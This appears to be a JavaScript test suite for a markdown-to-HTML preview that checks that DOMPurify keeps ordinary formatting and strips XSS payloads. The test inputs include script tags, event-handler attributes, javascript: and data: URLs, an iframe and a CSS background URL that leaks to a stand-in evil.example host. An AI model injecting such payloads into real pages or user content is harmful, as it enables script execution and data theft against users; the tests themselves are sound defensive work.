/*
 * Copyright JFX 2021-2023
 * MIT License
 * https://gitlab.com/jfx2006
 */

import { markdownRender, resetMarked } from "../markdown-render.js"
import DOMPurify from "../vendor/purify.es.mjs"

/* global describe, expect, it, beforeEach */

// Full pipeline as used by compose_preview.js: markdown -> marked -> DOMPurify.
async function renderAndSanitize(md) {
  const html = await markdownRender(md)
  return DOMPurify.sanitize(html)
}

describe("Sanitization (DOMPurify)", function () {
  beforeEach(async function () {
    await resetMarked({
      "math-value": null,
      "math-renderer": "disabled",
      "gfm-line-breaks-enabled": true,
      "smart-replacements-enabled": true,
    })
  })

  describe("legitimate markdown survives sanitization unchanged", function () {
    it("keeps bold, italics and inline code", async function () {
      var md = "**bold** _italics_ `code`"
      var out = await renderAndSanitize(md)
      expect(out).to.contain("<strong>bold</strong>")
      expect(out).to.contain("<em>italics</em>")
      expect(out).to.contain("<code>code</code>")
    })

    it("keeps normal links", async function () {
      var md = "[a link](https://example.com)"
      var out = await renderAndSanitize(md)
      expect(out).to.contain('<a href="https://example.com">a link</a>')
    })

    it("keeps images with normal src", async function () {
      var md = "![alt text](https://example.com/pic.png)"
      var out = await renderAndSanitize(md)
      expect(out).to.contain('<img src="https://example.com/pic.png"')
      expect(out).to.contain('alt="alt text"')
    })

    it("keeps tables", async function () {
      var md = "| a | b |\n| - | - |\n| 1 | 2 |"
      var out = await renderAndSanitize(md)
      expect(out).to.contain("<table>")
      expect(out).to.contain("<td>1</td>")
    })

    it("keeps fenced code blocks with syntax highlighting spans", async function () {
      var md = "```sql\nSELECT 1\n```"
      var out = await renderAndSanitize(md)
      expect(out).to.contain('<pre><code class="hljs language-sql">')
    })
  })

  describe("XSS payloads are stripped", function () {
    it("strips raw <script> tags embedded in markdown", async function () {
      var md = "hello <script>alert(1)</script> world"
      var out = await renderAndSanitize(md)
      expect(out).to.not.contain("<script")
      expect(out).to.not.contain("alert(1)")
    })

    it("strips onerror handlers on images", async function () {
      var md = '<img src="x" onerror="alert(1)">'
      var out = await renderAndSanitize(md)
      expect(out).to.not.contain("onerror")
    })

    it("strips onload handlers on inline SVG", async function () {
      var md = '<svg onload="alert(1)"></svg>'
      var out = await renderAndSanitize(md)
      expect(out).to.not.contain("onload")
    })

    it("strips javascript: URLs in links", async function () {
      var md = "[click me](javascript:alert(1))"
      var out = await renderAndSanitize(md)
      expect(out).to.not.contain("javascript:")
    })

    it("strips javascript: URLs in raw <a href>", async function () {
      var md = '<a href="javascript:alert(1)">click</a>'
      var out = await renderAndSanitize(md)
      expect(out).to.not.contain("javascript:")
    })

    it("strips <iframe> injection", async function () {
      var md = '<iframe src="https://evil.example"></iframe>'
      var out = await renderAndSanitize(md)
      expect(out).to.not.contain("<iframe")
    })

    it("strips inline event handler attributes on arbitrary elements", async function () {
      var md = '<div onclick="alert(1)">click me</div>'
      var out = await renderAndSanitize(md)
      expect(out).to.not.contain("onclick")
    })

    it("strips <style> based data exfiltration vectors", async function () {
      var md = '<style>*{background:url("https://evil.example/?leak")}</style>'
      var out = await renderAndSanitize(md)
      expect(out).to.not.contain("<style")
    })

    it("strips data: URIs containing inline scripts in href", async function () {
      var md = '<a href="data:text/html,<script>alert(1)</script>">click</a>'
      var out = await renderAndSanitize(md)
      expect(out).to.not.contain("<script")
    })

    it("strips form/formaction based navigation hijacking", async function () {
      var md = '<form action="javascript:alert(1)"><button>go</button></form>'
      var out = await renderAndSanitize(md)
      expect(out).to.not.contain("javascript:")
    })
  })
})
